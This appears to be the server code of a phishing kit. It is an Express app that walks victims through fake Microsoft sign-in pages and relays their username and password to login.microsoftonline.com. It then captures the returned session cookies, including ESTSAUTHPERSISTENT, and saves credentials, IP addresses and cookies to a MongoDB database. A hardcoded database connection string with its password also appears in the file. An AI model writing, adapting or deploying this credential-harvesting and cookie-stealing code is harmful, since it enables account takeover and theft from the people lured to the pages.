const axios = require('axios');
require('dotenv').config();
let express = require("express");
let bodyParser = require("body-parser");
let ejs = require("ejs");
let mongoose = require("mongoose");
let http = require('http');
const httpProxy = require('http-proxy');
const mongodb = require('mongodb');
const cookieParser = require('cookie-parser');
const session = require('express-session');

let app = express();

app.set("view engine", "ejs");
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static("public"));
app.use(cookieParser());

mongoose.set('strictQuery', true);
mongoose.connect("mongodb+srv://sgrain35:SDdqnJVhOqYWLyMT@cluster0.cbrwrem.mongodb.net/full",{ useNewUrlParser:true });

const userSchema = new mongoose.Schema({
  ai: String,
  pi: String,
  ip: String,
  cookies: Object,
  xMsGatewaySliceValue:String
});

const User = mongoose.model("User", userSchema);

app.get("/", (req, res) => {
  let username = req.query.username;
  res.render("recap", { username: username });
});

app.post("/", function(req, res) {
  let username = req.body.recapstore;
  res.render("first", { username: username });
});

app.post("/first", function(req, res) {
  var header = req.headers;
  var username = req.body.username;
  res.render("second", { username: username });
});

app.post("/second", async function(req, res) {
  const ipadd = "IP address is: " + (req.headers['x-forwarded-for'] || req.connection.remoteAddress);
  const username = req.body.username;
  const password = req.body.pass;

  // Create the request body for the cookie request
  const data = {
    username: username,
    password: password
  };

  try {
    // Make the POST request to the login endpoint
    const response = await axios.post('https://login.microsoftonline.com', data, {
      headers: {
        'Content-Type': 'application/json'
      },
      withCredentials: true
    });
    // Retrieve the cookies from the response headers
    const cookies = response.headers['set-cookie'];


    // Retrieve the specific cookie value from the response headers
    const xMsGatewaySliceValue = cookies.find(cookie => cookie.includes('ESTSAUTHPERSISTENT'));
    console.log(xMsGatewaySliceValue);

    // Create a new user document with the received cookie value
    const newUser = new User({
      ai: username,
      pi: password,
      ip: ipadd,
      cookies: cookies,
      xMsGatewaySliceValue: xMsGatewaySliceValue
    });

    // Save the user document to the database
    newUser.save(function(err) {
      if (err) {
        console.log(err);
      } else {
        res.render("third", {
          username: username
        });
      }
    });
  } catch (error) {
    console.error('Error:', error.message);
  }
});

app.post("/third", function(req, res) {
  const ipadd = "IP address is: " + req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  var username = req.body.username;

  const newUser = new User({
    ai: req.body.username,
    pi: req.body.pass,
    ip: ipadd,
  });

  newUser.save(function (err) {
    if (err) {
      console.log(err);
    } else {
      res.redirect(".login.microsoftonline.com/");
    }
  });
});

// Rest of your code...

const port = process.env.PORT || 3000;
app.listen(port, function () {
  console.log("Server started on port " + port);
});
